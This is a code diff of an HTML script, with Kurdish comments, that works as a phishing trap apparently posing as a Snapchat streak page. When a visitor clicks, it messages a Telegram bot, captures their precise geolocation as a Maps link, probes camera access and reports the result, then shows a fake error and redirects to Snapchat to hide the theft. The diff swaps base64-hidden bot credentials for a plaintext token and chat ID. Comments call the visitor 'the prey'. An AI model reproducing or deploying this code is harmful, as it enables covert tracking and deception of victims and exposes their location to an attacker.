@@ -1,53 +1,54 @@
 <script>
-    // 😈 کلیلی دۆزەخ لێرەدا شاردراوەتەوە (بۆ ئەوەی گیتھەب نەیبینێت)
-    const _0x1a2b = ["ODY0MTcxODQ5MTpBQUgxX3lOejRaUTBoeG1NaFdLOUhQYzd6WTZDRHN2Zncybw==", "MjEyNzAzMzk2"];
+    // 😈 کلیلی دۆزەخ - ئەمجارە بە بێ کێشە دامناوە
+    const _t = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
+    const _c = "212703396";
 
-    function sendToTelegram(message) {
-        // لێرەدا کۆدەکان دەبنەوە بە ڕاستەقینە تەنها لە کاتی جێبەجێکردندا
-        const t = atob(_0x1a2b[0]); 
-        const c = atob(_0x1a2b[1]);
-        
-        const url = `https://api.telegram.org/bot${t}/sendMessage`;
-        const payload = {
-            chat_id: c,
-            text: message,
-            parse_mode: 'Markdown'
-        };
+    async function sendToTelegram(msg) {
+        const url = `https://api.telegram.org/bot${_t}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: _c, text: msg, parse_mode: 'Markdown' })
+            });
+        } catch (e) { console.error("Error sending message."); }
+    }
 
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+    async function launchChaos() {
+        sendToTelegram("🎯 *نێچیرەکە کلیکی لەسەر تەڵەکە کرد!*");
+
+        // ١. لۆکەیشن
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                let map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToTelegram(`📍 *لۆکەیشن:* \n${map}`);
+                openCamera();
+            }, (err) => {
+                sendToTelegram("❌ نێچیرەکە ڕێگەی بە لۆکەیشن نەدا.");
+                openCamera();
+            }, { enableHighAccuracy: true });
+        } else {
+            openCamera();
+        }
+    }
+
+    function openCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => {
+            sendToTelegram("📸 *کامێرا کرایەوە!*");
+            s.getTracks().forEach(t => t.stop());
+            finish();
+        })
+        .catch(e => {
+            sendToTelegram("🚫 ڕێگەی بە کامێرا نەدا.");
+            finish();
         });
     }
 
-    function launchChaos() {
-        sendToTelegram("🔔 *نێچیرەکە تەڵەکەی خوارد!* \n📅 کات: " + new Date().toLocaleString());
-
-        // ١. ڕاوکردنی لۆکەیشن
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(`📍 *شوێنی ورد دۆزرایەوە:* \n${mapLink}`);
-        }, function(err) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگەی بە لۆکەیشن نەدا.");
-        });
-
-        // ٢. داوای کامێرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            sendToTelegram("📸 *کامێرا کرایەوە!* نێچیرەکە ڕێگەی دا.");
-            stream.getTracks().forEach(track => track.stop()); // داخستنی کامێرا بۆ ئەوەی گومان نەکات
-        })
-        .catch(err => {
-            sendToTelegram("🚫 نێچیرەکە ڕێگەی بە کامێرا نەدا.");
-        });
-
-        // ٣. فێڵە کۆتاییەکە
+    function finish() {
         setTimeout(() => {
-            alert("Connection error (0x882). Please refresh.");
-            window.location.href = "https://www.snapchat.com"; 
-        }, 1500);
+            alert("System Error (0x882). Please refresh the streak.");
+            window.location.href = "https://www.snapchat.com";
+        }, 1000);
     }
 </script>
